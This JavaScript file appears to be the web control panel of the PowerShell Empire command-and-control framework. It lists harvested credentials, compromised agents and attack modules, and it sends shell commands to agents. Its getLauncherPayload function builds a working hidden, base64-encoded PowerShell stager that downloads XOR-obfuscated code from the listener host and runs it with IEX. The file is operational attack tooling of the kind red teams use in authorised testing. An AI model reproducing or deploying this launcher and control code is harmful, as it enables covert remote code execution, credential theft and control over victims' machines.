
// powershell is stupid - encoding to UTF-16LE
// https://stackoverflow.com/questions/24379446/utf-8-to-utf-16le-javascript
// https://stackoverflow.com/questions/37596748/how-do-i-encode-a-javascript-string-in-utf-16
// https://stackoverflow.com/questions/6965107/converting-between-strings-and-arraybuffers
// https://stackoverflow.com/questions/9267899/arraybuffer-to-base64-encoded-string
function psEncode(text)
{
    var byteArray = new Uint8Array(text.length * 2);
    for (var i = 0; i < text.length; i++)
    {
        byteArray[i*2] = text.charCodeAt(i) // & 0xff;
        byteArray[i*2+1] = text.charCodeAt(i) >> 8 // & 0xff;
    }

    binary = ''; // convert to binary
    for (var i = 0; i < byteArray.length; i++)
    {
        binary += String.fromCharCode( byteArray[ i ] );
    }

    return btoa(binary);
    // please clap..
}

var app = angular.module("empire", []);
app.controller('main', ['$scope', function ($scope,$http)
{
    $scope.potato="It's a potato!";
    $scope.token="";

    if(window.location.href.split('?').length==2)
    {
        $scope.token="?"+window.location.href.split('?')[1];
        console.log("got token: "+$scope.token);
    }
    else
    {
        token="";
        console.log("no token found");
        console.log("count is "+window.location.href.split('?').length);
    }

    // set up some timers
    window.setInterval(function()
    {
        if($scope.token=="")
        {
            console.log("token is '"+$scope.token+"'");
            //$scope.loginStatus="please authenticate";
            $('#loginModal').modal('show');
            return;
        }

        $.get('api/listeners'+$scope.token,function(data) {
            //console.log('getting listeners');

            if(String($scope.listeners).length != String(data.listeners).length)
            {
                console.log("new listener data");
                $scope.listeners=data.listeners;
                $scope.$apply();
            }
        })

        $.get('api/creds'+$scope.token,function(data) {

            if(String($scope.creds).length != String(data.creds).length)
            {
                console.log("current creds data");
                $scope.creds=data.creds;
                $scope.$apply();
            }
        })

        $.get('api/agents'+$scope.token,function(data) {
            //console.log('getting agents');
            $scope.agents = data.agents;
            //$scope.$apply();
        })

        $.get('api/modules'+$scope.token,function(data) {

            if(String($scope.modules).length != String(data.modules).length)
            {
                console.log("current modules");
                $scope.modules = data.modules;
                $scope.$apply();
            }
        })

        $.get('api/reporting'+$scope.token,function(data) {

            if(String($scope.reporting).length != String(data.reporting).length)
            {
                console.log("new reporting data");
                $scope.reporting=data.reporting;

                $scope.$apply();
            }
        })

        // this is a good place to refresh agent results
        if($scope.currentAgent != "")
        {
            console.log("refreshing results for "+$scope.currentAgent.name);
            console.log("length "+$scope.currentAgent.results.length);
            console.log("length "+$scope.agents[$scope.currentAgentNumber].results.length);
            $scope.currentResults=JSON.parse($scope.agents[$scope.currentAgentNumber].results).reverse();
            $scope.$apply();
        }

    },1000);

    // some functions
    $scope.getLauncherPayload = function(listener,host,staging_key)
    {
        console.log(listener+" is at "+host);
        $scope.currentListener=listener;

        encoded = psEncode("[SySTeM.NET.SeRVicEPOintMAnageR]::ExPECt100COnTINue = 0;$wc=New-ObJEcT SySTEM.NeT.WEbCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeADERS.ADD('User-Agent',$u);$wC.PrOxy = [SYstEM.NEt.WebREQuesT]::DEfaulTWeBProxY;$wc.ProXy.CredeNTiAls = [SYsTEm.NeT.CReDenTIAlCACHe]::DefAUltNEtwOrKCredEnTiAls;$K='"+staging_key+"';$I=0;[cHAr[]]$b=([char[]]($WC.DoWNLoadStRiNg(\""+host+"/index.asp\")))|%{$_-bXOR$K[$i++%$K.LENGth]};IEX ($B-JoIN'')");

        $scope.launcherPayload="powershell.exe -NoP -sta -NonI -W Hidden -Enc "+encoded;

        $('#launcherModal').modal('show');
    }

    $scope.killListener = function(listener)
    {
        $.ajax({url: 'api/listeners/'+listener+$scope.token, type: 'DELETE'});
    }

    $scope.killAgent = function(agent)
    {
        $.ajax({url: 'api/agents/'+agent+'/kill'+$scope.token, type: 'POST'});
    }

    $scope.newListener = function()
    {
        console.log("getting listener options");

        $.get('api/listeners/options'+$scope.token,function(data) {
            $scope.listenerOptions=data.listeneroptions[0];
            $scope.$apply();
            console.log("got listener options "+JSON.stringify(data.listeneroptions));
            console.log("name is "+$scope.listenerOptions.Name.Value);
            $('#newListenerModal').modal('show');
        })
    }

    $scope.createListener = function()
    {
        var listenerString='{"Name":"'+$scope.listenerOptions.Name.Value+'","Host":"'+$scope.listenerOptions.Host.Value+'","Port":'+$scope.listenerOptions.Port.Value+'}'
        console.log("WOOOOO! "+listenerString);
        $.ajax({
            type:'POST',
            url:'api/listeners'+$scope.token,
            data:listenerString,
            contentType:"application/json; charset=utf-8",
            dataType:"json",
            success:function(data)
            {
                console.log(String(data));
                $('#newListenerModal').modal('hide');
            }});
    }

    $scope.empireLogin = function()
    {
        $scope.loginStatus="AUTHENTICATING..";
        //$scope.$apply();
        var loginString='{"username":["'+$scope.username+'"],"password":["'+$scope.password+'"]}'
        console.log("WOOOOO! "+loginString);
        $.ajax({
            type:'POST',
            url:'api/admin/login'+$scope.token,
            data:loginString,
            contentType:"application/json; charset=utf-8",
            dataType:"json",
            success:function(data)
            {
                $scope.loginStatus="authenticated!";
                console.log(JSON.stringify(data));
                $scope.token="?token="+data.token;
                window.location=window.location+$scope.token;
                $('#loginModal').modal('hide');
            },
            error:function(XMLHttpRequest, textStatus, errorThrown)
            {
                $scope.loginStatus=errorThrown;
                $scope.$apply();
                console.log(errorThrown);
            }});
    }

    $scope.currentAgent='';
    $scope.switchAgent = function(agent)
    {
        $scope.currentAgent='';
        $scope.currentResults=[""];
        for(x=0;x<$scope.agents.length;++x)
        {
            console.log("LOOP!! "+$scope.agents[x].name);

            if($scope.agents[x].name==agent)
            {
                $scope.currentAgentNumber=x;
                $scope.currentAgent=$scope.agents[x];
                $scope.currentResults=JSON.parse($scope.agents[x].results).reverse();
                //$scope.$apply();
            }
        }
    };
    $scope.logData = function()
    {
        // when agent is "", log data is displayed
        $scope.currentAgent="";
    };

    $scope.setPage = function(page)
    {
      console.log("setting page to "+page);
        // when agent is "", log data is displayed
        $scope.page=page;
    };

    $scope.currentCommand="";

    $scope.executeCommand = function(command)
    {
        $scope.execSpinner="*executing*";
        console.log("executing "+$scope.currentCommand);
        console.log("executing "+command);
        console.log("what "+$scope.currentAgent.name);

        commandObject={"command":command};

        $.ajax({
            type:'POST',
            url:'api/agents/'+$scope.currentAgent.name+'/shell'+$scope.token,
            data: JSON.stringify(commandObject),
            contentType:"application/json; charset=utf-8",
            dataType:"json",
            success:function(data)
            {
                $scope.execSpinner="";
                console.log("exec success");
                $scope.currentCommand="";
                $scope.$apply();
            }});
    };

    $scope.setupModule = function(module)
    {
      for(x=0;x<$scope.modules.length;++x)
      {
        console.log("MODULE LOOP!! "+$scope.modules[x].Name);

        if($scope.modules[x].Name==module)
        {
          console.log("FOUND "+module);
          $scope.currentModule=$scope.modules[x];


          $scope.currentModule.options['Agent'].Value=$scope.currentAgent.name;
          $('#execModuleModal').modal('show');

          return;
        }  
      }
      $scope.moduleSpinner="module not found";
      console.log("WHAT??")
    };

    $scope.executeModule = function()
    {
        $scope.moduleSpinner="executing module";
        console.log("executing "+$scope.currentModule);
        //console.log("executing "+module);
        console.log("what "+$scope.currentAgent.name);

        console.log("agent is: "+$scope.currentModule.options['Agent'].Value);
        console.log("keys are: "+Object.keys($scope.currentModule.options));

        var keys = Array.from(Object.keys($scope.currentModule.options));
        var moduleString='{';
        for(key in $scope.currentModule.options)
        {
          console.log("got key: "+key); // 'Agent' should be first key
          console.log("value is: "+$scope.currentModule.options[key].Value);

          // don't record empty arguments
          if($scope.currentModule.options[key].Value=='')continue;

          moduleString=moduleString+'"'+key+'":"'+$scope.currentModule.options[key].Value+'",';
        }
        moduleString=moduleString.slice(0, -1)+'}'; // replace last comma with closing bracket

        console.log("module string: "+moduleString);

        $.ajax({
            type:'POST',
            url:'api/modules/'+$scope.currentModule.Name+$scope.token,
            data:moduleString,
            contentType:"application/json",
            dataType:"json",
            success:function(data)
            {
                $scope.moduleSpinner="";
                console.log("module success");
                $scope.currentModule="";
                $scope.$apply();
                $('#execModuleModal').modal('hide');
            },
            error:function(XMLHttpRequest, textStatus, errorThrown)
            {
                error = JSON.parse(XMLHttpRequest.responseText)['error'];
                console.log(error);
                $scope.moduleSpinner=error;
                $scope.$apply();
            }
        });
    };
}]);

console.log("I'm still here!");
